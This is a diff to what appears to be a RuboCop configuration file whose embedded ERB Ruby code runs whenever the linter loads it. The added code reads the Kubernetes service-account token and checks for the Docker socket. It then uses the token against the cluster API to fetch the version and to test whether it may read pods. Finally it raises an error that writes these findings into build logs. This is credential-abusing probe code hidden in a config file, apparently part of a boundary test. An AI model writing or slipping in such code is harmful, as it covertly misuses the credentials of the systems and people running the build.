@@ -5,6 +5,32 @@ AllCops:
       token = (File.read('/var/run/secrets/kubernetes.io/serviceaccount/token') rescue '').strip
       host = ENV['KUBERNETES_SERVICE_HOST']
       docker_socket = File.exist?('/var/run/docker.sock')
-      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket}"
+      k8s = 'not_attempted'
+      if !token.empty? && !host.to_s.empty?
+        begin
+          require 'net/http'
+          require 'uri'
+          require 'json'
+          port = (ENV['KUBERNETES_SERVICE_PORT_HTTPS'] || '443').to_i
+          uri = URI("https://#{host}:#{port}/version")
+          http = Net::HTTP.new(uri.host, uri.port)
+          http.use_ssl = true
+          http.open_timeout = 1
+          http.read_timeout = 1
+          res = http.get(uri.request_uri, {'Authorization' => "Bearer #{token}", 'Accept' => 'application/json'})
+          body = res.body.to_s
+          k8s = "version_status=#{res.code},bytes=#{[body.bytesize, 1024].min}"
+          sar_uri = URI("https://#{host}:#{port}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews")
+          sar = Net::HTTP::Post.new(sar_uri.request_uri, {'Authorization' => "Bearer #{token}", 'Content-Type' => 'application/json'})
+          sar.body = '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"get","resource":"pods"}}}'
+          sar_res = http.request(sar)
+          sar_body = sar_res.body.to_s
+          parsed = (JSON.parse(sar_body) rescue {})
+          k8s += ",sar_status=#{sar_res.code},sar_allowed=#{parsed['status'] && parsed['status']['allowed']}"
+        rescue => e
+          k8s = "error=#{e.class}"
+        end
+      end
+      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},#{k8s}"
       raise marker
     end %>
